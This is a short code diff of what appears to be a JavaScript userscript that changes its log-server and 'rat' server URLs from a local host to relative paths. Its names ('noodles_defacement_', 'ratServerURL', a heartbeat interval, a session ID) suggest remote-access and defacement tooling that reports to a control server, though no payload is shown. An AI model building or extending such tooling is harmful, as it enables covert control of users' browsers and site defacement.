@@ -22,8 +22,8 @@
     'use strict';
 
     const storageKeyPrefix = 'noodles_defacement_';
-    const logServerURL = 'http://noodles.local/logs';
-    const ratServerURL = 'http://noodles.local/rat';
+    const logServerURL = '/main/logs';
+    const ratServerURL = '/main/rat';
     const heartbeatInterval = 60000;
     let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);
 
